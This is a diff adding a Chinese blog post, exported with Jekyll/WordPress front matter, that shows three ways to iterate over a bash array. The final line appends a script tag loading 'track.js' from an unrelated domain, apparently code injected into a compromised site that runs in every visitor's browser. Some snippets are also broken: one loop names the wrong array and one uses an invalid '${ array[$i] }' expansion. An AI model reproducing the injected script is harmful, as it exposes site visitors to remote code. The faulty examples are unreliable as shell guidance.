@@ -1,0 +1,49 @@
+---
+layout: post
+title: shell数组遍历
+date: 2021-06-24 15:54:29.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Linux
+tags: []
+meta:
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2021/06/24/shell%e6%95%b0%e7%bb%84%e9%81%8d%e5%8e%86/"
+---
+<p>首先创建一个数组 array=( A B C D 1 2 3 4)<br />
+<strong>1.标准的for循环</strong></p>
+<p>for(( i=0;i&lt;${#array[@]};i++)) do<br />
+#${#array[@]}获取数组长度用于循环<br />
+echo ${array[i]};<br />
+done;</p>
+<p><strong>2.for … in</strong><br />
+遍历（不带数组下标）：</p>
+<p>for element in ${array[@]}<br />
+#也可以写成for element in ${array[*]}<br />
+do<br />
+echo $element<br />
+done<br />
+遍历（带数组下标）：</p>
+<p>for i in "${!arr[@]}";<br />
+do<br />
+printf "%s\t%s\n" "$i" "${arr[$i]}"<br />
+done</p>
+<p><strong>3.While循环法：</strong></p>
+<p>i=0<br />
+while [ $i -lt ${#array[@]} ]<br />
+#当变量（下标）小于数组长度时进入循环体<br />
+do<br />
+echo ${ array[$i] }<br />
+#按下标打印数组元素<br />
+let i++<br />
+done<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
